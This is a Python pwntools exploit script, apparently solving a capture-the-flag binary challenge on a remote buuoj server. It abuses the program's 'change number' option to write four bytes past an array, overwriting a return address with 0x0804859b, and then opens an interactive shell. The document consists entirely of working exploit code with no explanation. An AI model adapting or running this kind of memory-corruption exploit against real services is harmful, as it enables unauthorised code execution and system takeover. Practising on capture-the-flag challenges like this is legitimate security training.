from pwn import *
r = remote('node3.buuoj.cn',28198)
context.log_level = 'debug'

def change(offset, num):
	r.sendline('3')
	r.recvuntil("which number to change:")
	r.sendline(str(offset))
	r.recvuntil('new number:')
	r.sendline(str(num))

r.recvuntil("How many numbers you have:")
r.sendline('1')
r.recvuntil("Give me your numbers")
r.sendline('1')

change(0x84, 0x9b)
change(0x85, 0x85)
change(0x86, 0x04)
change(0x87, 0x08)


r.sendline('5')
r.interactive()

